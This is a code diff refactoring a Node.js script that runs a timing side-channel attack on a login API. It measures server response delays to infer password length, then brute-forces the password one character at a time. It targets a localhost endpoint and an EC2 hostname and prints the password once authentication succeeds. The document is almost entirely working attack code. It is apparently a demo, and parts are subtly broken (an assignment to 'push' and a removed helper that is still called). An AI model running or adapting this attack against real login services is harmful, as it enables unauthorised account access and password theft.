@@ -1,181 +1,159 @@
 const fetch = require('node-fetch');
-const {exampleCharSet} = require('./charSet.json');
+const charSet = require('./charSet.js');
+const state = require('./state.js');
+const threshold = require('./threshold.js');
+const log = require('./log.js');
+const time = require('./time.js');
 
 const devEnv = process.env.NODE_ENV === 'develop';
 const URL = devEnv ? 'http://localhost:8000/api/login' : 'http://ec2-107-23-202-11.compute-1.amazonaws.com/api/login';
-console.log(`NODE_ENV: ${process.env.NODE_ENV}. URL: ${URL}`);
 
-let password = exampleCharSet[0];
-let charIndex = 0;
-let exampleCharSetPointer = 0;
-let sizedMatchedTimes = 0;
-let charIndexMatchedTimes = 0;
-let establishConnectionRequestTimes = 0;
-let connectionLatencyReestablishedTimes = 0;
-let latency = 0;
-let STATE_RECALCULATE_LATENCY = false;
+// log(`threshold: ${JSON.stringify(threshold, null, 2)}`, 0);
+//
+// threshold.sleepDiff = 23984723894;
+// log(`threshold: ${JSON.stringify(threshold, null, 2)}`, 0);
 
-const serverResponseTimes = [];
-const sleepDiffThreshold = 300;
-const stableConnectionBestFiveResponseTimeDifferenceThreshold = 300;
-const matchedTimesThreshold = 10;
-const establishConnectionRequestThreshold = 10;
-const exampleCharSetLength = exampleCharSet.length - 1;
+// process.exit(420);
 
+const getNextFromExampleCharSet = () => charSet.exampleCharSet[state.exampleCharSetPointer++];
+const isLastCharInExampleCharSet = () => charSet.exampleCharSetLength === state.exampleCharSetPointer;
 
-const getNextFromExampleCharSet = () => exampleCharSet[exampleCharSetPointer++];
-const isLastCharInExampleCharSet = () => exampleCharSetLength === exampleCharSetPointer;
-const sleep = async (ms) => {
-    return await new Promise(resolve => setTimeout(resolve, ms));
-};
-const generateRandomInteger = (min, max) => {
-    return ~~(min + Math.random() * (max + 1 - min))
-};
 const bruteForce = () => {
     if (isLastCharInExampleCharSet()) {
-        console.warn('__Last char in Example charset reached. Reset exampleCharSetPointer and move back one charIndex__');
-        exampleCharSetPointer = 0;
-        --charIndex;
+        log('__Last char in Example charset reached. Reset exampleCharSetPointer and move back one charIndex__', 1);
+        state.exampleCharSetPointer = 0;
+        --state.charIndex;
     }
-    const newPassword = password.substr(0, charIndex) + getNextFromExampleCharSet() + password.substr(charIndex + 1);
-    console.log(`newPassword: ${newPassword}`);
-    password = newPassword;
+    const newPassword = `${state.password.substr(0, state.charIndex)}${getNextFromExampleCharSet()}${state.password.substr(state.charIndex + 1)}`;
+    log(`newPassword: ${newPassword}`, 3);
+    state.password = newPassword;
 };
 const generatePassword = () => {
-    if (sizedMatchedTimes === matchedTimesThreshold) {
-        if (charIndexMatchedTimes === 0) {
-            bruteForce(password);
+    if (state.sizedMatchedTimes === threshold.matchedTimes) {
+        if (state.charIndexMatchedTimes === 0) {
+            bruteForce(state.password);
         }
-    } else if (sizedMatchedTimes === 0) {
-        password += exampleCharSet[0];
+    } else if (state.sizedMatchedTimes === 0) {
+        state.password += charSet.exampleCharSet[0];
     }
 };
-const calculateSizeMatched = (diff) => diff > latency + sleepDiffThreshold;
-
-const reset = () => {
-    password = exampleCharSet[0];
-    charIndex = 0;
-    exampleCharSetPointer = 0;
-    sizedMatchedTimes = 0;
-    charIndexMatchedTimes = 0;
-};
+const calculateSizeMatched = (diff) => diff > state.latency + threshold.sleepDiff;
 
 const shouldRecalculateLatency = (diff) => {
-    const strangeLatencyDiffOccured = diff - serverResponseTimes[serverResponseTimes.length-1] > sleepDiffThreshold;
-    if (strangeLatencyDiffOccured) {
-        STATE_RECALCULATE_LATENCY = true;
-        console.warn(`strangeLatencyDiffOccured.
+    const strangeLatencyDifferenceOccurred = diff - state.serverResponseTimes[state.serverResponseTimes.length-1] > threshold.sleepDiff;
+    if (strangeLatencyDifferenceOccurred) {
+        state.RECALCULATE_LATENCY = true;
+        log(`Strange Latency Difference Occurred.
         diff: ${diff}
-        last server response time: ${serverResponseTimes[serverResponseTimes.length-1]}
-        sleepDiffThreshold: ${sleepDiffThreshold}
-        diff - last responseTime was bigger then threshold (${diff - serverResponseTimes[serverResponseTimes.length-1]}).`);
-        if (connectionLatencyReestablishedTimes === establishConnectionRequestThreshold) {
-            STATE_RECALCULATE_LATENCY = false;
-            connectionLatencyReestablishedTimes = 0;
-            latency = diff - serverResponseTimes[serverResponseTimes.length-1] - sleepDiffThreshold;
+        last server response time: ${state.serverResponseTimes[state.serverResponseTimes.length-1]}
+        sleepDiffThreshold: ${threshold.sleepDiff}
+        diff - last responseTime was bigger then threshold (${diff - state.serverResponseTimes[state.serverResponseTimes.length-1]}).`, 1);
+        if (state.connectionLatencyReestablishedTimes === threshold.establishConnectionRequest) {
+            state.RECALCULATE_LATENCY = false;
+            state.connectionLatencyReestablishedTimes = 0;
+            state.latency = diff - state.serverResponseTimes[state.serverResponseTimes.length-1] - threshold.sleepDiff;
+            log(`connection response time back to normal.
+                diff: ${diff}
+                last server response time: ${state.serverResponseTimes[state.serverResponseTimes.length-1]}
+                sleepDiffThreshold: ${threshold.sleepDiff}
+                diff - last responseTime was bigger then threshold (${diff - state.serverResponseTimes[state.serverResponseTimes.length-1]})
+                latency (${state.latency}).`, 2);
         }
-    } else if (STATE_RECALCULATE_LATENCY) {
-        connectionLatencyReestablishedTimes++;
+    } else if (state.RECALCULATE_LATENCY) {
+        state.connectionLatencyReestablishedTimes++;
     }
 
-    serverResponseTimes.push=(diff);
+    state.serverResponseTimes.push=(diff);
+    return state.RECALCULATE_LATENCY;
 };
 const calculateCharIndexMatched = (diff) => {
     if (shouldRecalculateLatency(diff)) {
         return false;
     }
-    let calcThreshold = latency + (charIndex + 2) * sleepDiffThreshold;
-    // let calcThreshold = (charIndex + 2) * sleepDiffThreshold;
-    if (diff < sleepDiffThreshold) {
-        reset();
+    let calcThreshold = state.latency + (state.charIndex + 2) * threshold.sleepDiff;
+    if (diff < threshold.sleepDiff) {
+        state.reset();
     }
-    // let calcThreshold = threshold;
-    // console.log(`diff: ${diff} ms`);
-    // console.log(`calcThreshold: ${calcThreshold} ms`);
+    log(`diff: ${diff} ms`, 5);
+    log(`calcThreshold: ${calcThreshold} ms`, 5);
     return diff > calcThreshold;
 };
 
 async function establishStableConnection() {
     const startTime = process.hrtime();
     await fetch(URL, getFetchOptions());
-    serverResponseTimes.push(getDiff(startTime));
+    state.serverResponseTimes.push(getDiff(startTime));
 
-    if (establishConnectionRequestTimes++ < establishConnectionRequestThreshold) {
+    if (state.establishConnectionRequestTimes++ < threshold.establishConnectionRequest) {
         return await establishStableConnection();
     }
-    serverResponseTimes.sort((a, b) => a - b);
-    let l = serverResponseTimes.length - 1;
-    const establishedConnectResponseTimeDifference = serverResponseTimes[l] - serverResponseTimes[l - 5];
-    if (establishedConnectResponseTimeDifference > stableConnectionBestFiveResponseTimeDifferenceThreshold) {
-        console.error(`could not establish a solid, stable connection between the server. From (${establishConnectionRequestThreshold}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}. Shut down, try again later.`);
-        process.exit(0);
+    state.serverResponseTimes.sort((a, b) => a - b);
+    let l = state.serverResponseTimes.length - 1;
+    const establishedConnectResponseTimeDifference = state.serverResponseTimes[l] - state.serverResponseTimes[l - 5];
+    if (establishedConnectResponseTimeDifference > threshold.stableConnectionBestFiveResponseTimeDifference) {
+        console.error(`could not establish a solid, stable connection between the server. From (${threshold.establishConnectionRequest}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}. Shut down, try again later.`);
+        process.exit(666);
     }
-    latency = sleepDiffThreshold - serverResponseTimes[0];
-    latency = latency < 0 ? 10 : latency;
-    console.log(
+    state.latency = threshold.sleepDiff - state.serverResponseTimes[0];
+    state.latency = state.latency < 0 ? 10 : state.latency;
+    log(
         `Established stable connection between the server.
-        From (${establishConnectionRequestThreshold}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}.
-        serverResponseTimes: ${JSON.stringify(serverResponseTimes)} ms.
-        latency: ${JSON.stringify(latency)} ms.
-        Starting the timing attack.`);
+        From (${threshold.establishConnectionRequest}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}.
+        state.serverResponseTimes: ${JSON.stringify(state.serverResponseTimes)} ms.
+        latency: ${JSON.stringify(state.latency)} ms.
+        Starting the timing attack.`, 2);
     await test();
 }
-
-const getDiff = (startTime) => {
-    const rawDiff = process.hrtime(startTime);
-    const mSec = rawDiff[1].toString().substr(0, 3);
-    return Number(`${rawDiff[0]}${mSec}`);
-};
 
 const getFetchOptions = () => {
     return {
         method: 'post',
         headers: {'content-type': 'application/json'},
-        body: JSON.stringify({accountId: 'asdasd', password})
+        body: JSON.stringify({accountId: 'asdasd', password: state.password})
     };
 };
 
 async function test() {
     const startTime = process.hrtime();
     const result = await fetch(URL, getFetchOptions());
-    const diff = getDiff(startTime);
+    const diff = time.getDiff(startTime);
     const {authenticated} = await result.json();
     if (authenticated) {
-        console.warn(`password: ${password}`);
-        process.exit(0);
+        console.log(`password: ${state.password}`);
+        process.exit(420);
     } else {
-        await sleep(50);
+        await time.sleep(50);
         let sizeMatched = calculateSizeMatched(diff);
-        if (sizeMatched && sizedMatchedTimes !== matchedTimesThreshold) {
-            sizedMatchedTimes++;
-        } else if (sizedMatchedTimes === matchedTimesThreshold) {
+        if (sizeMatched && state.sizedMatchedTimes !== threshold.matchedTimes) {
+            state.sizedMatchedTimes++;
+        } else if (state.sizedMatchedTimes === threshold.matchedTimes) {
             let charIndexMatched = calculateCharIndexMatched(diff);
-            if (charIndexMatched && charIndexMatchedTimes !== matchedTimesThreshold) {
-                // console.log(`charIndexMatched: ${charIndexMatched}`);
-                console.log(`charIndexMatchedTimes: ${charIndexMatchedTimes}`);
-                charIndexMatchedTimes++;
-            } else if (charIndexMatchedTimes === matchedTimesThreshold) {
-                charIndex++;
-                exampleCharSetPointer = 0;
-                charIndexMatchedTimes = 0;
-                console.warn(`charIndex Matched ${matchedTimesThreshold} times.`);
-                console.log(`charIndex: ${charIndex}`);
+            if (charIndexMatched && state.charIndexMatchedTimes !== threshold.matchedTimes) {
+                log(`charIndexMatchedTimes: ${state.charIndexMatchedTimes}`, 2);
+                state.charIndexMatchedTimes++;
+            } else if (state.charIndexMatchedTimes === threshold.matchedTimes) {
+                state.charIndex++;
+                state.exampleCharSetPointer = 0;
+                state.charIndexMatchedTimes = 0;
+                log(`charIndex Matched ${threshold.matchedTimes} times.`, 2);
+                log(`charIndex: ${state.charIndex}`, 2);
             } else {
-                charIndexMatchedTimes = 0;
+                state.charIndexMatchedTimes = 0;
             }
         } else {
-            sizedMatchedTimes = 0;
+            state.sizedMatchedTimes = 0;
         }
-        // if (password.length === 6) {
-        // if (password.length === 6) {
-        //     console.log(`password: ${password} (length: 6)`);
+        // if (state.password.length === 6) {
+        log(`password: ${state.password}`, 3);
+        log(`diff: ${diff}`, 3);
         // }
-        console.log(`password: ${password}`);
-        console.log(`diff: ${diff}`);
-        // }
-        // console.log(`diff: ${diff}`);
-        // console.log(`sizeMatched: ${sizeMatched} (${sizedMatchedTimes})`);
         await test(generatePassword());
+    }
+}
+
+async function timingAttackDemo() {
+    switch (state.actualState) {
+
     }
 }
 
